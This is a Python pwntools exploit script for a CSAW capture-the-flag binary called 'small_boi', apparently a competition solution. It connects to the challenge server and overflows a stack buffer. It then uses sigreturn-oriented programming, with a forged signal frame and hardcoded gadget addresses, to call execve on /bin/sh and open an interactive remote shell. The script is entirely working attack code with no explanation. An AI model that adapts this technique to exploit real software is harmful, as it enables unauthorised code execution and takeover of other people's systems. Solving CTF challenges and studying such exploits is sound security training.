from pwn import *


context.clear()
context.arch = "amd64" # Architecture

## Creating a custom frame
frame = SigreturnFrame()
bin_sh = 0x004001ca
syscall = 0x0000000000400185
pop_rax = 0x000000000040018a
pop_rbp = 0x0000000000400188
sigreturn = 0x0000000000400180#0x000000000040017c#
read = 0x400190
bss = 0x0000000000601000+0x200
r = remote("pwn.chal.csaw.io", 1002)#process("./small_boi")

off = 40
"""
p = ''
p += "A"*(off-8)
p += p64(bss) #saved rbp
p += p64(read) #writing into bss
p += "junkjunk"
p += p64(sigreturn)
p += "\x00"*104
p += p64(bin_sh)
p += "\x00"*8+p64(bss)+"\x00"*8+"\x00"*8+"\x00"*8+"\x00"*8+p64(bss-32)
p += p64(pop_rax)#rip
"""
frame.rax = 0x3b
frame.rdi = bin_sh
frame.rsi = 0x0
frame.rdx = 0x0
frame.rip = syscall
p = ""
p += "A"*(off-8)
p += p64(bss) #saved rbp
p += p64(read) #writing into bss
p += "junkjunk"
p += p64(sigreturn)
p += str(frame)
#gdb.attach(r,"b *0x000000000040018a\nc")
r.sendline(p)
time.sleep(0.2)
p = ''
p += p64(0x3b)
p += p64(syscall)
r.send(p)
r.interactive()
